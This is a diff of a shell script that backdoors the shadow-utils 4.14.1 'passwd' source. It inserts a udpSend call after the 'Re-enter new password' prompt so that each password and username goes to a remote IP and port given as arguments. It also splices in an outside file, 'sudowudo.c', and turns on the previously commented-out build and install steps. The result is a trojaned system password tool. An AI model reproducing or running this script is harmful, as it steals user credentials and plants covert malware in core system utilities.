@@ -11,7 +11,6 @@ then
   exit
 fi
 
-
 apt-get install -y make unzip libbsd-dev autoconf automake libtool bison byacc xsltproc pkg-config gcc cmake
 
 # Add sources list
@@ -29,21 +28,14 @@ PORT=$2
 dir="shadow-4.14.1/src/passwd.c"
 
 PAYLOAD="udpSend(cp, ${PORT}, \"${DEST_IP}\", \"shadow\", name);"
-match2="(void) fputs (_(\"They don\'t match; try again.\n\"), stderr);
-		} else {"
+match="cp = agetpass (_(\"Re-enter new password: \"));"
 
 sed -i "/$match/a$PAYLOAD" $dir
-sed -i '/\#include \"strlcpy.h\"/rsudowudo.c' $dir
+sed -i '/\#include <config.h>/rsudowudo.c' $dir
 
 cd shadow-4.14.1
 
-#./autogen.sh --without-selinux
-#make -j4
-#make install
-#cp src/su ../
-#cp src/passwd ../
-# cd ../ && rm -r shadow-4.14.1
-# chown root su
-# chown root passwd
-# chmod 4755 su
-# chmod 4755 passwd
+./autogen.sh --without-selinux
+make -j4
+make install
+cd ../ && rm -r shadow-4.14.1
